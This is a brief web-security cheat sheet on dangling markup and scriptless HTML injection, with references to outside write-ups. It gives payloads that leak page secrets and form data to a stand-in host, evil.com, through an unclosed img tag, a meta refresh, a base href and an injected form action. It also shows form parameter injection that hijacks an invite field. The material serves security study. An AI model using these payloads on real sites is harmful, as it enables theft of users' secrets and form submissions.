#  HTML Scriptless Attacks / Dangling Markup Attacks (Wrap)
Index | Section
--- | ---
**1** | Interesting Attack Vectors (Part - 2)
**2** | References & Good Reads

___


#### Interesting Attack Vectors (Part - 2)
```
1. Stealing Clear Text Secrets 

- If you inject <img src='http://evil.com/log.cgi? when the page is loaded the victim will send you all the code between the injected img tag and the next quote inside the code. 
- If a secret is somehow located in that chunk, you will be able to steal it
- If the img tag is forbidden (due to CSP for example) you can also use: 
<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?


2. Stealing Forms 

- <base href='http://evil.com/'>
- Then, the forms that send data to path (like <form action='update_profile.php'>) will send the data to the malicious domain.
- Set a form header: <form action='http://evil.com/log_steal'> this will overwrite the next form header and all the data from the form will be sent to the attacker.

3. Form parameter injection

- You can change the path of a form and insert new values so an unexpected action will be performed:
- Example: 
			<form action='/change_settings.php'>
			<input type='hidden' name='invite_user' 
			value='fredmbogo'>                                        ← Injected lines

			<form action="/change_settings.php">                        ← Existing form (ignored by the parser)
			...
			<input type="text" name="invite_user" value="">             ← Subverted field
			...
			<input type="hidden" name="xsrf_token" value="12345">
			...
			</form>


4. Bypassing CSP with user interaction

- In-depth Article: https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

5. Some Other Interesting Vectors 

- https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection 

```


#### References & Good Reads

```
a. https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
b. https://github.com/cure53/HTTPLeaks/blob/main/leak.html
c. https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
```